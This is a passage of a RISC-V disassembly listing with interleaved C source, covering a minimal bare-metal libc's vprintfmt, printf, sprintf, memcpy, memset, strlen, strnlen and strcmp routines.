    80002028:	b77d                	j	80001fd6 <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    8000202a:	03000793          	li	a5,48
    8000202e:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80002032:	b755                	j	80001fd6 <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    80002034:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    80002038:	fc842703          	lw	a4,-56(s0)
    8000203c:	87ba                	mv	a5,a4
    8000203e:	0027979b          	slliw	a5,a5,0x2
    80002042:	9fb9                	addw	a5,a5,a4
    80002044:	0017979b          	slliw	a5,a5,0x1
    80002048:	2781                	sext.w	a5,a5
    8000204a:	9fa5                	addw	a5,a5,s1
    8000204c:	2781                	sext.w	a5,a5
    8000204e:	fd07879b          	addiw	a5,a5,-48
    80002052:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    80002056:	f9843783          	ld	a5,-104(s0)
    8000205a:	0007c783          	lbu	a5,0(a5)
    8000205e:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    80002062:	8726                	mv	a4,s1
    80002064:	02f00793          	li	a5,47
    80002068:	04e7d363          	ble	a4,a5,800020ae <vprintfmt+0x154>
    8000206c:	8726                	mv	a4,s1
    8000206e:	03900793          	li	a5,57
    80002072:	02e7ce63          	blt	a5,a4,800020ae <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    80002076:	f9843783          	ld	a5,-104(s0)
    8000207a:	0785                	addi	a5,a5,1
    8000207c:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    80002080:	bf65                	j	80002038 <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    80002082:	f9043783          	ld	a5,-112(s0)
    80002086:	00878713          	addi	a4,a5,8
    8000208a:	f8e43823          	sd	a4,-112(s0)
    8000208e:	439c                	lw	a5,0(a5)
    80002090:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    80002094:	a831                	j	800020b0 <vprintfmt+0x156>

    case '.':
      if (width < 0)
    80002096:	fcc42783          	lw	a5,-52(s0)
    8000209a:	2781                	sext.w	a5,a5
    8000209c:	f207dde3          	bgez	a5,80001fd6 <vprintfmt+0x7c>
        width = 0;
    800020a0:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    800020a4:	bf0d                	j	80001fd6 <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    800020a6:	4785                	li	a5,1
    800020a8:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    800020ac:	b72d                	j	80001fd6 <vprintfmt+0x7c>
      goto process_precision;
    800020ae:	0001                	nop

    process_precision:
      if (width < 0)
    800020b0:	fcc42783          	lw	a5,-52(s0)
    800020b4:	2781                	sext.w	a5,a5
    800020b6:	f207d0e3          	bgez	a5,80001fd6 <vprintfmt+0x7c>
        width = precision, precision = -1;
    800020ba:	fc842783          	lw	a5,-56(s0)
    800020be:	fcf42623          	sw	a5,-52(s0)
    800020c2:	57fd                	li	a5,-1
    800020c4:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    800020c8:	b739                	j	80001fd6 <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    800020ca:	fd042783          	lw	a5,-48(s0)
    800020ce:	2785                	addiw	a5,a5,1
    800020d0:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    800020d4:	b709                	j	80001fd6 <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    800020d6:	f9043783          	ld	a5,-112(s0)
    800020da:	00878713          	addi	a4,a5,8
    800020de:	f8e43823          	sd	a4,-112(s0)
    800020e2:	439c                	lw	a5,0(a5)
    800020e4:	fa843703          	ld	a4,-88(s0)
    800020e8:	fa043583          	ld	a1,-96(s0)
    800020ec:	853e                	mv	a0,a5
    800020ee:	9702                	jalr	a4
      break;
    800020f0:	aa65                	j	800022a8 <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    800020f2:	f9043783          	ld	a5,-112(s0)
    800020f6:	00878713          	addi	a4,a5,8
    800020fa:	f8e43823          	sd	a4,-112(s0)
    800020fe:	0007b903          	ld	s2,0(a5)
    80002102:	00091663          	bnez	s2,8000210e <vprintfmt+0x1b4>
        p = "(null)";
    80002106:	00001917          	auipc	s2,0x1
    8000210a:	85290913          	addi	s2,s2,-1966 # 80002958 <atol+0x278>
      if (width > 0 && padc != '-')
    8000210e:	fcc42783          	lw	a5,-52(s0)
    80002112:	2781                	sext.w	a5,a5
    80002114:	06f05a63          	blez	a5,80002188 <vprintfmt+0x22e>
    80002118:	fc744783          	lbu	a5,-57(s0)
    8000211c:	0ff7f713          	andi	a4,a5,255
    80002120:	02d00793          	li	a5,45
    80002124:	06f70263          	beq	a4,a5,80002188 <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    80002128:	fcc42483          	lw	s1,-52(s0)
    8000212c:	fc842783          	lw	a5,-56(s0)
    80002130:	85be                	mv	a1,a5
    80002132:	854a                	mv	a0,s2
    80002134:	4a4000ef          	jal	ra,800025d8 <strnlen>
    80002138:	87aa                	mv	a5,a0
    8000213a:	2781                	sext.w	a5,a5
    8000213c:	40f487bb          	subw	a5,s1,a5
    80002140:	2781                	sext.w	a5,a5
    80002142:	fcf42623          	sw	a5,-52(s0)
    80002146:	a839                	j	80002164 <vprintfmt+0x20a>
          putch(padc, putdat);
    80002148:	fc744783          	lbu	a5,-57(s0)
    8000214c:	2781                	sext.w	a5,a5
    8000214e:	fa843703          	ld	a4,-88(s0)
    80002152:	fa043583          	ld	a1,-96(s0)
    80002156:	853e                	mv	a0,a5
    80002158:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    8000215a:	fcc42783          	lw	a5,-52(s0)
    8000215e:	37fd                	addiw	a5,a5,-1
    80002160:	fcf42623          	sw	a5,-52(s0)
    80002164:	fcc42783          	lw	a5,-52(s0)
    80002168:	2781                	sext.w	a5,a5
    8000216a:	fcf04fe3          	bgtz	a5,80002148 <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    8000216e:	a829                	j	80002188 <vprintfmt+0x22e>
        putch(ch, putdat);
    80002170:	fa843783          	ld	a5,-88(s0)
    80002174:	fa043583          	ld	a1,-96(s0)
    80002178:	8526                	mv	a0,s1
    8000217a:	9782                	jalr	a5
        p++;
    8000217c:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    8000217e:	fcc42783          	lw	a5,-52(s0)
    80002182:	37fd                	addiw	a5,a5,-1
    80002184:	fcf42623          	sw	a5,-52(s0)
    80002188:	00094783          	lbu	a5,0(s2)
    8000218c:	0007849b          	sext.w	s1,a5
    80002190:	cc8d                	beqz	s1,800021ca <vprintfmt+0x270>
    80002192:	fc842783          	lw	a5,-56(s0)
    80002196:	2781                	sext.w	a5,a5
    80002198:	fc07cce3          	bltz	a5,80002170 <vprintfmt+0x216>
    8000219c:	fc842783          	lw	a5,-56(s0)
    800021a0:	37fd                	addiw	a5,a5,-1
    800021a2:	fcf42423          	sw	a5,-56(s0)
    800021a6:	fc842783          	lw	a5,-56(s0)
    800021aa:	2781                	sext.w	a5,a5
    800021ac:	fc07d2e3          	bgez	a5,80002170 <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    800021b0:	a829                	j	800021ca <vprintfmt+0x270>
        putch(' ', putdat);
    800021b2:	fa843783          	ld	a5,-88(s0)
    800021b6:	fa043583          	ld	a1,-96(s0)
    800021ba:	02000513          	li	a0,32
    800021be:	9782                	jalr	a5
      for (; width > 0; width--)
    800021c0:	fcc42783          	lw	a5,-52(s0)
    800021c4:	37fd                	addiw	a5,a5,-1
    800021c6:	fcf42623          	sw	a5,-52(s0)
    800021ca:	fcc42783          	lw	a5,-52(s0)
    800021ce:	2781                	sext.w	a5,a5
    800021d0:	fef041e3          	bgtz	a5,800021b2 <vprintfmt+0x258>
      break;
    800021d4:	a8d1                	j	800022a8 <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    800021d6:	fd042703          	lw	a4,-48(s0)
    800021da:	f9040793          	addi	a5,s0,-112
    800021de:	85ba                	mv	a1,a4
    800021e0:	853e                	mv	a0,a5
    800021e2:	d11ff0ef          	jal	ra,80001ef2 <getint>
    800021e6:	87aa                	mv	a5,a0
    800021e8:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    800021ec:	fd843783          	ld	a5,-40(s0)
    800021f0:	0007df63          	bgez	a5,8000220e <vprintfmt+0x2b4>
        putch('-', putdat);
    800021f4:	fa843783          	ld	a5,-88(s0)
    800021f8:	fa043583          	ld	a1,-96(s0)
    800021fc:	02d00513          	li	a0,45
    80002200:	9782                	jalr	a5
        num = -(long long) num;
    80002202:	fd843783          	ld	a5,-40(s0)
    80002206:	40f007b3          	neg	a5,a5
    8000220a:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    8000220e:	47a9                	li	a5,10
    80002210:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    80002214:	a0b9                	j	80002262 <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    80002216:	47a9                	li	a5,10
    80002218:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    8000221c:	a80d                	j	8000224e <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    8000221e:	47a1                	li	a5,8
    80002220:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002224:	a02d                	j	8000224e <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    80002226:	4785                	li	a5,1
    80002228:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    8000222c:	fa843783          	ld	a5,-88(s0)
    80002230:	fa043583          	ld	a1,-96(s0)
    80002234:	03000513          	li	a0,48
    80002238:	9782                	jalr	a5
      putch('x', putdat);
    8000223a:	fa843783          	ld	a5,-88(s0)
    8000223e:	fa043583          	ld	a1,-96(s0)
    80002242:	07800513          	li	a0,120
    80002246:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    80002248:	47c1                	li	a5,16
    8000224a:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    8000224e:	fd042703          	lw	a4,-48(s0)
    80002252:	f9040793          	addi	a5,s0,-112
    80002256:	85ba                	mv	a1,a4
    80002258:	853e                	mv	a0,a5
    8000225a:	c2dff0ef          	jal	ra,80001e86 <getuint>
    8000225e:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    80002262:	fd442683          	lw	a3,-44(s0)
    80002266:	fc744783          	lbu	a5,-57(s0)
    8000226a:	2781                	sext.w	a5,a5
    8000226c:	fcc42703          	lw	a4,-52(s0)
    80002270:	fd843603          	ld	a2,-40(s0)
    80002274:	fa043583          	ld	a1,-96(s0)
    80002278:	fa843503          	ld	a0,-88(s0)
    8000227c:	b09ff0ef          	jal	ra,80001d84 <printnum>
      break;
    80002280:	a025                	j	800022a8 <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    80002282:	fa843783          	ld	a5,-88(s0)
    80002286:	fa043583          	ld	a1,-96(s0)
    8000228a:	8526                	mv	a0,s1
    8000228c:	9782                	jalr	a5
      break;
    8000228e:	a829                	j	800022a8 <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    80002290:	fa843783          	ld	a5,-88(s0)
    80002294:	fa043583          	ld	a1,-96(s0)
    80002298:	02500513          	li	a0,37
    8000229c:	9782                	jalr	a5
      fmt = last_fmt;
    8000229e:	fb843783          	ld	a5,-72(s0)
    800022a2:	f8f43c23          	sd	a5,-104(s0)
      break;
    800022a6:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    800022a8:	b1ed                	j	80001f92 <vprintfmt+0x38>
        return;
    800022aa:	0001                	nop
    }
  }
}
    800022ac:	70a6                	ld	ra,104(sp)
    800022ae:	7406                	ld	s0,96(sp)
    800022b0:	64e6                	ld	s1,88(sp)
    800022b2:	6946                	ld	s2,80(sp)
    800022b4:	6165                	addi	sp,sp,112
    800022b6:	8082                	ret

00000000800022b8 <printf>:

int printf(const char* fmt, ...)
{
    800022b8:	7159                	addi	sp,sp,-112
    800022ba:	f406                	sd	ra,40(sp)
    800022bc:	f022                	sd	s0,32(sp)
    800022be:	1800                	addi	s0,sp,48
    800022c0:	fca43c23          	sd	a0,-40(s0)
    800022c4:	e40c                	sd	a1,8(s0)
    800022c6:	e810                	sd	a2,16(s0)
    800022c8:	ec14                	sd	a3,24(s0)
    800022ca:	f018                	sd	a4,32(s0)
    800022cc:	f41c                	sd	a5,40(s0)
    800022ce:	03043823          	sd	a6,48(s0)
    800022d2:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    800022d6:	04040793          	addi	a5,s0,64
    800022da:	fcf43823          	sd	a5,-48(s0)
    800022de:	fd043783          	ld	a5,-48(s0)
    800022e2:	fc878793          	addi	a5,a5,-56
    800022e6:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    800022ea:	fe843783          	ld	a5,-24(s0)
    800022ee:	86be                	mv	a3,a5
    800022f0:	fd843603          	ld	a2,-40(s0)
    800022f4:	4581                	li	a1,0
    800022f6:	00000517          	auipc	a0,0x0
    800022fa:	98e50513          	addi	a0,a0,-1650 # 80001c84 <putchar>
    800022fe:	c5dff0ef          	jal	ra,80001f5a <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002302:	4781                	li	a5,0
}
    80002304:	853e                	mv	a0,a5
    80002306:	70a2                	ld	ra,40(sp)
    80002308:	7402                	ld	s0,32(sp)
    8000230a:	6165                	addi	sp,sp,112
    8000230c:	8082                	ret

000000008000230e <sprintf_putch.3105>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    8000230e:	7139                	addi	sp,sp,-64
    80002310:	fc22                	sd	s0,56(sp)
    80002312:	0080                	addi	s0,sp,64
    80002314:	87aa                	mv	a5,a0
    80002316:	fcb43823          	sd	a1,-48(s0)
    8000231a:	fcf42e23          	sw	a5,-36(s0)
    8000231e:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002322:	fd043783          	ld	a5,-48(s0)
    80002326:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    8000232a:	fe843783          	ld	a5,-24(s0)
    8000232e:	639c                	ld	a5,0(a5)
    80002330:	fdc42703          	lw	a4,-36(s0)
    80002334:	0ff77713          	andi	a4,a4,255
    80002338:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    8000233c:	fe843783          	ld	a5,-24(s0)
    80002340:	639c                	ld	a5,0(a5)
    80002342:	00178713          	addi	a4,a5,1
    80002346:	fe843783          	ld	a5,-24(s0)
    8000234a:	e398                	sd	a4,0(a5)
  }
    8000234c:	0001                	nop
    8000234e:	7462                	ld	s0,56(sp)
    80002350:	6121                	addi	sp,sp,64
    80002352:	8082                	ret

0000000080002354 <sprintf>:
{
    80002354:	716d                	addi	sp,sp,-272
    80002356:	ed86                	sd	ra,216(sp)
    80002358:	e9a2                	sd	s0,208(sp)
    8000235a:	1180                	addi	s0,sp,224
    8000235c:	f2a43c23          	sd	a0,-200(s0)
    80002360:	f2b43823          	sd	a1,-208(s0)
    80002364:	e010                	sd	a2,0(s0)
    80002366:	e414                	sd	a3,8(s0)
    80002368:	e818                	sd	a4,16(s0)
    8000236a:	ec1c                	sd	a5,24(s0)
    8000236c:	03043023          	sd	a6,32(s0)
    80002370:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    80002374:	03040793          	addi	a5,s0,48
    80002378:	f2f43423          	sd	a5,-216(s0)
    8000237c:	f2843783          	ld	a5,-216(s0)
    80002380:	fcf43c23          	sd	a5,-40(s0)
    80002384:	f4840793          	addi	a5,s0,-184
    80002388:	f4840713          	addi	a4,s0,-184
    8000238c:	39700693          	li	a3,919
    80002390:	c394                	sw	a3,0(a5)
    80002392:	0183b6b7          	lui	a3,0x183b
    80002396:	30368693          	addi	a3,a3,771 # 183b303 <_tbss_end+0x183b27f>
    8000239a:	c3d4                	sw	a3,4(a5)
    8000239c:	0103b6b7          	lui	a3,0x103b
    800023a0:	38368693          	addi	a3,a3,899 # 103b383 <_tbss_end+0x103b2ff>
    800023a4:	c794                	sw	a3,8(a5)
    800023a6:	000306b7          	lui	a3,0x30
    800023aa:	06768693          	addi	a3,a3,103 # 30067 <_tbss_end+0x2ffe3>
    800023ae:	c7d4                	sw	a3,12(a5)
    800023b0:	eb98                	sd	a4,16(a5)
    800023b2:	00000717          	auipc	a4,0x0
    800023b6:	f5c70713          	addi	a4,a4,-164 # 8000230e <sprintf_putch.3105>
    800023ba:	ef98                	sd	a4,24(a5)
    800023bc:	0000100f          	fence.i
  char* str0 = str;
    800023c0:	f3843783          	ld	a5,-200(s0)
    800023c4:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    800023c8:	03040793          	addi	a5,s0,48
    800023cc:	f2f43423          	sd	a5,-216(s0)
    800023d0:	f2843783          	ld	a5,-216(s0)
    800023d4:	fd078793          	addi	a5,a5,-48
    800023d8:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    800023dc:	fe043703          	ld	a4,-32(s0)
    800023e0:	f4840793          	addi	a5,s0,-184
    800023e4:	853e                	mv	a0,a5
    800023e6:	f3840793          	addi	a5,s0,-200
    800023ea:	86ba                	mv	a3,a4
    800023ec:	f3043603          	ld	a2,-208(s0)
    800023f0:	85be                	mv	a1,a5
    800023f2:	b69ff0ef          	jal	ra,80001f5a <vprintfmt>
  *str = 0;
    800023f6:	f3843783          	ld	a5,-200(s0)
    800023fa:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    800023fe:	f3843703          	ld	a4,-200(s0)
    80002402:	fe843783          	ld	a5,-24(s0)
    80002406:	40f707b3          	sub	a5,a4,a5
    8000240a:	2781                	sext.w	a5,a5
}
    8000240c:	853e                	mv	a0,a5
    8000240e:	60ee                	ld	ra,216(sp)
    80002410:	644e                	ld	s0,208(sp)
    80002412:	6151                	addi	sp,sp,272
    80002414:	8082                	ret

0000000080002416 <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    80002416:	715d                	addi	sp,sp,-80
    80002418:	e4a2                	sd	s0,72(sp)
    8000241a:	0880                	addi	s0,sp,80
    8000241c:	fca43423          	sd	a0,-56(s0)
    80002420:	fcb43023          	sd	a1,-64(s0)
    80002424:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002428:	fc843703          	ld	a4,-56(s0)
    8000242c:	fc043783          	ld	a5,-64(s0)
    80002430:	8f5d                	or	a4,a4,a5
    80002432:	fb843783          	ld	a5,-72(s0)
    80002436:	8fd9                	or	a5,a5,a4
    80002438:	8b9d                	andi	a5,a5,7
    8000243a:	e3b1                	bnez	a5,8000247e <memcpy+0x68>
    const uintptr_t* s = src;
    8000243c:	fc043783          	ld	a5,-64(s0)
    80002440:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    80002444:	fc843783          	ld	a5,-56(s0)
    80002448:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    8000244c:	a839                	j	8000246a <memcpy+0x54>
      *d++ = *s++;
    8000244e:	fe843703          	ld	a4,-24(s0)
    80002452:	00870793          	addi	a5,a4,8
    80002456:	fef43423          	sd	a5,-24(s0)
    8000245a:	fe043783          	ld	a5,-32(s0)
    8000245e:	00878693          	addi	a3,a5,8
    80002462:	fed43023          	sd	a3,-32(s0)
    80002466:	6318                	ld	a4,0(a4)
    80002468:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000246a:	fc843703          	ld	a4,-56(s0)
    8000246e:	fb843783          	ld	a5,-72(s0)
    80002472:	97ba                	add	a5,a5,a4
    80002474:	fe043703          	ld	a4,-32(s0)
    80002478:	fcf76be3          	bltu	a4,a5,8000244e <memcpy+0x38>
    8000247c:	a099                	j	800024c2 <memcpy+0xac>
  } else {
    const char* s = src;
    8000247e:	fc043783          	ld	a5,-64(s0)
    80002482:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    80002486:	fc843783          	ld	a5,-56(s0)
    8000248a:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    8000248e:	a00d                	j	800024b0 <memcpy+0x9a>
      *d++ = *s++;
    80002490:	fd843703          	ld	a4,-40(s0)
    80002494:	00170793          	addi	a5,a4,1
    80002498:	fcf43c23          	sd	a5,-40(s0)
    8000249c:	fd043783          	ld	a5,-48(s0)
    800024a0:	00178693          	addi	a3,a5,1
    800024a4:	fcd43823          	sd	a3,-48(s0)
    800024a8:	00074703          	lbu	a4,0(a4)
    800024ac:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800024b0:	fc843703          	ld	a4,-56(s0)
    800024b4:	fb843783          	ld	a5,-72(s0)
    800024b8:	97ba                	add	a5,a5,a4
    800024ba:	fd043703          	ld	a4,-48(s0)
    800024be:	fcf769e3          	bltu	a4,a5,80002490 <memcpy+0x7a>
  }
  return dest;
    800024c2:	fc843783          	ld	a5,-56(s0)
}
    800024c6:	853e                	mv	a0,a5
    800024c8:	6426                	ld	s0,72(sp)
    800024ca:	6161                	addi	sp,sp,80
    800024cc:	8082                	ret

00000000800024ce <memset>:

void* memset(void* dest, int byte, size_t len)
{
    800024ce:	715d                	addi	sp,sp,-80
    800024d0:	e4a2                	sd	s0,72(sp)
    800024d2:	0880                	addi	s0,sp,80
    800024d4:	fca43423          	sd	a0,-56(s0)
    800024d8:	87ae                	mv	a5,a1
    800024da:	fac43c23          	sd	a2,-72(s0)
    800024de:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    800024e2:	fc843703          	ld	a4,-56(s0)
    800024e6:	fb843783          	ld	a5,-72(s0)
    800024ea:	8fd9                	or	a5,a5,a4
    800024ec:	8b9d                	andi	a5,a5,7
    800024ee:	e7bd                	bnez	a5,8000255c <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    800024f0:	fc442783          	lw	a5,-60(s0)
    800024f4:	0ff7f793          	andi	a5,a5,255
    800024f8:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    800024fc:	fd843783          	ld	a5,-40(s0)
    80002500:	07a2                	slli	a5,a5,0x8
    80002502:	fd843703          	ld	a4,-40(s0)
    80002506:	8fd9                	or	a5,a5,a4
    80002508:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    8000250c:	fd843783          	ld	a5,-40(s0)
    80002510:	07c2                	slli	a5,a5,0x10
    80002512:	fd843703          	ld	a4,-40(s0)
    80002516:	8fd9                	or	a5,a5,a4
    80002518:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    8000251c:	fd843783          	ld	a5,-40(s0)
    80002520:	1782                	slli	a5,a5,0x20
    80002522:	fd843703          	ld	a4,-40(s0)
    80002526:	8fd9                	or	a5,a5,a4
    80002528:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    8000252c:	fc843783          	ld	a5,-56(s0)
    80002530:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    80002534:	a811                	j	80002548 <memset+0x7a>
      *d++ = word;
    80002536:	fe843783          	ld	a5,-24(s0)
    8000253a:	00878713          	addi	a4,a5,8
    8000253e:	fee43423          	sd	a4,-24(s0)
    80002542:	fd843703          	ld	a4,-40(s0)
    80002546:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    80002548:	fc843703          	ld	a4,-56(s0)
    8000254c:	fb843783          	ld	a5,-72(s0)
    80002550:	97ba                	add	a5,a5,a4
    80002552:	fe843703          	ld	a4,-24(s0)
    80002556:	fef760e3          	bltu	a4,a5,80002536 <memset+0x68>
    8000255a:	a81d                	j	80002590 <memset+0xc2>
  } else {
    char *d = dest;
    8000255c:	fc843783          	ld	a5,-56(s0)
    80002560:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    80002564:	a829                	j	8000257e <memset+0xb0>
      *d++ = byte;
    80002566:	fe043783          	ld	a5,-32(s0)
    8000256a:	00178713          	addi	a4,a5,1
    8000256e:	fee43023          	sd	a4,-32(s0)
    80002572:	fc442703          	lw	a4,-60(s0)
    80002576:	0ff77713          	andi	a4,a4,255
    8000257a:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    8000257e:	fc843703          	ld	a4,-56(s0)
    80002582:	fb843783          	ld	a5,-72(s0)
    80002586:	97ba                	add	a5,a5,a4
    80002588:	fe043703          	ld	a4,-32(s0)
    8000258c:	fcf76de3          	bltu	a4,a5,80002566 <memset+0x98>
  }
  return dest;
    80002590:	fc843783          	ld	a5,-56(s0)
}
    80002594:	853e                	mv	a0,a5
    80002596:	6426                	ld	s0,72(sp)
    80002598:	6161                	addi	sp,sp,80
    8000259a:	8082                	ret

000000008000259c <strlen>:

size_t strlen(const char *s)
{
    8000259c:	7179                	addi	sp,sp,-48
    8000259e:	f422                	sd	s0,40(sp)
    800025a0:	1800                	addi	s0,sp,48
    800025a2:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    800025a6:	fd843783          	ld	a5,-40(s0)
    800025aa:	fef43423          	sd	a5,-24(s0)
  while (*p)
    800025ae:	a031                	j	800025ba <strlen+0x1e>
    p++;
    800025b0:	fe843783          	ld	a5,-24(s0)
    800025b4:	0785                	addi	a5,a5,1
    800025b6:	fef43423          	sd	a5,-24(s0)
  while (*p)
    800025ba:	fe843783          	ld	a5,-24(s0)
    800025be:	0007c783          	lbu	a5,0(a5)
    800025c2:	f7fd                	bnez	a5,800025b0 <strlen+0x14>
  return p - s;
    800025c4:	fe843703          	ld	a4,-24(s0)
    800025c8:	fd843783          	ld	a5,-40(s0)
    800025cc:	40f707b3          	sub	a5,a4,a5
}
    800025d0:	853e                	mv	a0,a5
    800025d2:	7422                	ld	s0,40(sp)
    800025d4:	6145                	addi	sp,sp,48
    800025d6:	8082                	ret

00000000800025d8 <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    800025d8:	7179                	addi	sp,sp,-48
    800025da:	f422                	sd	s0,40(sp)
    800025dc:	1800                	addi	s0,sp,48
    800025de:	fca43c23          	sd	a0,-40(s0)
    800025e2:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    800025e6:	fd843783          	ld	a5,-40(s0)
    800025ea:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800025ee:	a031                	j	800025fa <strnlen+0x22>
    p++;
    800025f0:	fe843783          	ld	a5,-24(s0)
    800025f4:	0785                	addi	a5,a5,1
    800025f6:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800025fa:	fd043783          	ld	a5,-48(s0)
    800025fe:	fff78713          	addi	a4,a5,-1
    80002602:	fce43823          	sd	a4,-48(s0)
    80002606:	c791                	beqz	a5,80002612 <strnlen+0x3a>
    80002608:	fe843783          	ld	a5,-24(s0)
    8000260c:	0007c783          	lbu	a5,0(a5)
    80002610:	f3e5                	bnez	a5,800025f0 <strnlen+0x18>
  return p - s;
    80002612:	fe843703          	ld	a4,-24(s0)
    80002616:	fd843783          	ld	a5,-40(s0)
    8000261a:	40f707b3          	sub	a5,a4,a5
}
    8000261e:	853e                	mv	a0,a5
    80002620:	7422                	ld	s0,40(sp)
    80002622:	6145                	addi	sp,sp,48
    80002624:	8082                	ret

0000000080002626 <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    80002626:	7179                	addi	sp,sp,-48
    80002628:	f422                	sd	s0,40(sp)
    8000262a:	1800                	addi	s0,sp,48
    8000262c:	fca43c23          	sd	a0,-40(s0)
    80002630:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    80002634:	fd843783          	ld	a5,-40(s0)
    80002638:	00178713          	addi	a4,a5,1
    8000263c:	fce43c23          	sd	a4,-40(s0)
    80002640:	0007c783          	lbu	a5,0(a5)
    80002644:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    80002648:	fd043783          	ld	a5,-48(s0)
    8000264c:	00178713          	addi	a4,a5,1
    80002650:	fce43823          	sd	a4,-48(s0)
    80002654:	0007c783          	lbu	a5,0(a5)
    80002658:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    8000265c:	fef44783          	lbu	a5,-17(s0)
    80002660:	0ff7f793          	andi	a5,a5,255
    80002664:	cb99                	beqz	a5,8000267a <strcmp+0x54>
    80002666:	fef44703          	lbu	a4,-17(s0)
    8000266a:	fee44783          	lbu	a5,-18(s0)
    8000266e:	0ff77713          	andi	a4,a4,255
    80002672:	0ff7f793          	andi	a5,a5,255
    80002676:	faf70fe3          	beq	a4,a5,80002634 <strcmp+0xe>

  return c1 - c2;
